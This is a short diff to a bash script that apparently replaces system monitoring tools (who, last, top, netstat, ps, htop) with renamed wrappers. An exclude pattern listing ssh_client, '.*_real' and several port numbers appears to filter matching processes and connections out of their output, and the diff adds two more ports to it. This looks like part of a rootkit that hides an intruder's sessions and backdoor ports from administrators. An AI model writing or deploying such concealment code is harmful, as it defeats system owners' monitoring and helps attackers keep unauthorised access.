@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 bins=("who" "last" "top" "netstat" "ps" "htop")
 replacewith=("what" "long" "pot" "nest" "elf" "hpot")
-exclude="mail|uucp|ssh_client|capbarb|grep|.*_real|what|elf|9999|2323"
+exclude="mail|uucp|ssh_client|capbarb|grep|.*_real|what|elf|9999|2323|1919|1212"
 
 for i in "${!bins[@]}"; do
     cmd="${bins[$i]}"
